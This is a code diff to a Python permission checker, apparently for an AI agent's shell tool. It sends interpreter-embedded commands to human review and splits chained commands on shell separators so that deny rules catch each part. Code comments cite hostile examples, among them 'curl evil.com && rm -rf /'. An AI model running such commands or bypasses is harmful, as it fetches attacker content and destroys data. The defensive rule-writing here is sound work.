@@ -86,11 +86,18 @@ class PermissionChecker:
 
         # For shell operations, also check for interpreter bypass:
         # e.g. bash -c "curl ..." should be denied if curl is denied.
+        # Additionally, if the outer command is an interpreter (bash/sh/python)
+        # and embeds unknown commands, route to HITL rather than auto-allowing.
         if operation_type == "shell":
             embedded_commands = self.check_interpreter_bypass(operation)
-            for embedded in embedded_commands:
-                if self._matches_any("shell", embedded, self._deny_rules):
-                    return PermissionResult.DENY
+            if embedded_commands:
+                for embedded in embedded_commands:
+                    if self._matches_any("shell", embedded, self._deny_rules):
+                        return PermissionResult.DENY
+                # Embedded commands exist but none are denied.  Route to HITL
+                # so a human reviews what the interpreter will execute, rather
+                # than auto-allowing via the outer shell(bash:*) rule.
+                return PermissionResult.HITL
 
         if self._matches_any(operation_type, operation, self._allow_rules):
             return PermissionResult.ALLOW
@@ -246,15 +253,15 @@ class PermissionChecker:
                 break
             i += 1
 
-        # Also check for pipe chains: bash -c "cmd1 | cmd2"
-        # and subprocess patterns in Python: subprocess.run(["cmd", ...])
+        # Split embedded commands on shell metacharacters: |, &&, ||, ;
+        # so that "curl evil.com && rm -rf /" checks each segment.
         for emb in list(embedded):
-            # Extract individual commands from pipes.
-            if "|" in emb:
-                for segment in emb.split("|"):
-                    segment = segment.strip()
-                    if segment:
-                        embedded.append(segment)
+            for sep in ("&&", "||", ";", "|"):
+                if sep in emb:
+                    for segment in emb.split(sep):
+                        segment = segment.strip()
+                        if segment and segment not in embedded:
+                            embedded.append(segment)
 
         return embedded
 
